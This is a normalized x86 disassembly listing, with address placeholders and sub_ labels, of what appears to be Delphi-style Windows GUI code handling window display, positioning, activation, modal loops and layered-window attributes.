mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a8c0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e3ac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45bc28
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43db94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45bbf8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4587c8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4587c8
jmp r-xdata
sub_45a7c5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e194
call sub_403a98
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459518
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441ec0
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_444968
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a8c0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
call sub_45517c
mov ebx eax
sub_45a90c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45a964
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a9c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45a9d0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40348c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a9fc
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45e180
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40348c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45ab9c
jmp r-xdata
mov eax ebx
call sub_45ac38
mov dl 0x1
mov eax ebx
call sub_458788
jmp r-xdata
sub_45aaa0
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_458114
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_458160
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45ab04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403730#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40348c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ac38
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45abbc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45ac2a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac31
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_459414
sub_45ac54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45af1c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43c9ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45d0f4
xor edx edx
push ebp
push sub_45aeff
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413af0
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45c124
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45502c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45aedd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45aba4
xor edx edx
push ebp
push sub_45ae3c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ab04
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45df00
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_444968
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae43
mov eax [ ebp - 0x4 ]
call sub_45ab9c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45ae43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aee7
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45c124
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45c124
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413a6c
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413bb8
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4550e0
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45af2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45af2c
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45af9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45af2c
pop ecx
mov eax [ esi + 0x34 ]
call sub_450484
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_450494
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45b020
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442cb8
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_45b044
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40348c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45b074
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b044
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b074
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b0f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45b044
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45b044
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45b074
pop ecx
test al al
je r-xdata
sub_45b144
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40348c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45b174
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b144
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b174
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b1f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45b144
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45b144
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45b174
pop ecx
test al al
je r-xdata
sub_45b244
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413a74
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44a614
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45b298
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45b244
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40348c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b314
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419bbc
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45b350
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43e630
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43f334
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b398
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_444968
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_444968
push eax
call RedrawWindow
sub_45b4ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45629c
mov dl 0x5
mov eax ebx
call sub_458010
mov dl 0x1
mov eax ebx
call sub_443544
mov dl 0x3
mov eax ebx
call sub_45830c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b554
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45b62b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443404
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_443270
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43d660
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e0c0
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4040d0
mov eax [ ebp - 0xc ]
call sub_4042a0
push eax
mov eax [ ebp - 0xc ]
call sub_4044a0
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43e0d0
mov eax [ ebp - 0xc ]
call sub_4042a0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b632
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov dl 0x1
mov eax esi
call sub_457690
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43e17c
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40462c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45b658
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_441698
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_456db4
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44165c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_45b6a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_443404
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45b6d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443c0c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45b6f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_459a60
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_443404
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_444968
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_444968
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_443418
or ecx 0xffffffff
mov dl 0x1
call sub_43e7f4
pop esi
pop ebx
retn
sub_45b790
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44407c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43f334
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43daec
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40348c
sub_45b7e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45b8ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43e0c0
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4040d0
mov eax [ ebp - 0x4 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a0
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43e0d0
mov eax [ ebp - 0x4 ]
call sub_4042a0
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43e17c
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b8b5
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_457690
jmp r-xdata
mov edx ebx
dec edx
